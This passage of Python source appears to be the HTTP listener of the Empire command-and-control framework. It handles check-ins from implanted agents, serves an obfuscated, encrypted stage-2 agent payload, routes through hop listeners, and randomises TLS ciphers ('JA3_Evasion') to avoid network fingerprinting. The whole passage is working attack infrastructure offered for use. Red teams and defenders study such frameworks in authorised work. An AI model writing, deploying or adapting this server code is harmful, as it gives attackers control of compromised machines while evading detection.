            # Get the request User-Agent to customize the agent profile
            listenerName = self.options['Name']['Value']
            clientUserAgent = request.headers['User-Agent']
            message = "[!] POST with user-agent {} from {}".format(clientUserAgent, clientIP)
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
            defaultUserAgent = listenerOptions['DefaultProfile']['Value'].split('|')[1]
            if clientUserAgent and clientUserAgent != defaultUserAgent:
                newProfile = listenerOptions['DefaultProfile']['Value'].split('|')[0] + '|' + clientUserAgent
                message = "[!] POST New listenerOptions {} for {}".format(newProfile, listenerName)
                signal = json.dumps({
                    'print': True,
                    'message': message
                })
                dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
                listenerOptions['DefaultProfile']['Value'] = newProfile

            requestData = request.get_data()

            listenerName = self.options["Name"]["Value"]
            message = "[*] POST request data length from {} : {}".format(
                clientIP, len(requestData)
            )
            signal = json.dumps({"print": False, "message": message})
            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))

            # the routing packet should be at the front of the binary request.data
            #   NOTE: this can also go into a cookie/etc.
            dataResults = self.mainMenu.agents.handle_agent_data(
                stagingKey, requestData, listenerOptions, clientIP
            )
            if dataResults and len(dataResults) > 0:
                for (language, results) in dataResults:
                    if isinstance(results, str):
                        results = results.encode("UTF-8")

                    if results:
                        if results.startswith(b"STAGE2"):
                            # TODO: document the exact results structure returned
                            if ":" in clientIP:
                                clientIP = "[" + str(clientIP) + "]"
                            sessionID = results.split(b" ")[1].strip().decode("UTF-8")
                            sessionKey = self.mainMenu.agents.agents[sessionID][
                                "sessionKey"
                            ]

                            listenerName = self.options["Name"]["Value"]
                            message = "[*] Sending agent (stage 2) to {} at {}".format(
                                sessionID, clientIP
                            )
                            signal = json.dumps({"print": True, "message": message})
                            dispatcher.send(
                                signal, sender="listeners/http/{}".format(listenerName)
                            )

                            hopListenerName = request.headers.get("Hop-Name")

                            # Check for hop listener
                            hopListener = data_util.get_listener_options(
                                hopListenerName
                            )
                            tempListenerOptions = copy.deepcopy(listenerOptions)
                            if hopListener is not None:
                                tempListenerOptions["Host"][
                                    "Value"
                                ] = hopListener.options["Host"]["Value"]
                            else:
                                tempListenerOptions = listenerOptions

                            session_info = (
                                Session()
                                .query(models.Agent)
                                .filter(models.Agent.session_id == sessionID)
                                .first()
                            )
                            if session_info.language == "ironpython":
                                version = "ironpython"
                            else:
                                version = ""

                            # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                            agentCode = self.generate_agent(
                                language=language,
                                listenerOptions=tempListenerOptions,
                                obfuscate=self.mainMenu.obfuscate,
                                obfuscationCommand=self.mainMenu.obfuscateCommand,
                                version=version,
                            )
                            encryptedAgent = encryption.aes_encrypt_then_hmac(
                                sessionKey, agentCode
                            )
                            # TODO: wrap ^ in a routing packet?

                            return make_response(encryptedAgent, 200)

                        elif results[:10].lower().startswith(b"error") or results[
                            :10
                        ].lower().startswith(b"exception"):
                            listenerName = self.options["Name"]["Value"]
                            message = (
                                "[!] Error returned for results by {} : {}".format(
                                    clientIP, results
                                )
                            )
                            signal = json.dumps({"print": True, "message": message})
                            dispatcher.send(
                                signal, sender="listeners/http/{}".format(listenerName)
                            )
                            return make_response(self.default_response(), 404)
                        elif results.startswith(b"VALID"):
                            listenerName = self.options["Name"]["Value"]
                            message = "[*] Valid results returned by {}".format(
                                clientIP
                            )
                            signal = json.dumps({"print": False, "message": message})
                            dispatcher.send(
                                signal, sender="listeners/http/{}".format(listenerName)
                            )
                            return make_response(self.default_response(), 200)
                        else:
                            return make_response(results, 200)
                    else:
                        return make_response(self.default_response(), 404)
            else:
                return make_response(self.default_response(), 404)

        try:
            certPath = listenerOptions["CertPath"]["Value"]
            host = listenerOptions["Host"]["Value"]
            ja3_evasion = listenerOptions["JA3_Evasion"]["Value"]

            if certPath.strip() != "" and host.startswith("https"):
                certPath = os.path.abspath(certPath)
                pyversion = sys.version_info

                # support any version of tls
                pyversion = sys.version_info
                if pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13:
                    proto = ssl.PROTOCOL_TLS
                elif pyversion[0] >= 3:
                    proto = ssl.PROTOCOL_TLS
                else:
                    proto = ssl.PROTOCOL_SSLv23

                context = ssl.SSLContext(proto)
                context.load_cert_chain(
                    "%s/empire-chain.pem" % (certPath),
                    "%s/empire-priv.key" % (certPath),
                )

                if ja3_evasion:
                    context.set_ciphers(listener_util.generate_random_cipher())

                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
            else:
                app.run(host=bindIP, port=int(port), threaded=True)

        except Exception as e:
            print(
                helpers.color("[!] Listener startup on port %s failed: %s " % (port, e))
            )
            listenerName = self.options["Name"]["Value"]
            message = "[!] Listener startup on port {} failed: {}".format(port, e)
            signal = json.dumps({"print": True, "message": message})
            dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))

    def start(self, name=""):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.threads dictionary keyed by the listener name.
        """
        listenerOptions = self.options
        if name and name != "":
            self.threads[name] = helpers.KThread(
                target=self.start_server, args=(listenerOptions,)
            )
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions["Name"]["Value"]
            self.threads[name] = helpers.KThread(
                target=self.start_server, args=(listenerOptions,)
            )
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()

    def shutdown(self, name=""):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """

        if name and name != "":
            print(helpers.color("[!] Killing listener '%s'" % (name)))
            self.threads[name].kill()
        else:
            print(
                helpers.color(
                    "[!] Killing listener '%s'" % (self.options["Name"]["Value"])
                )
            )
            self.threads[self.options["Name"]["Value"]].kill()
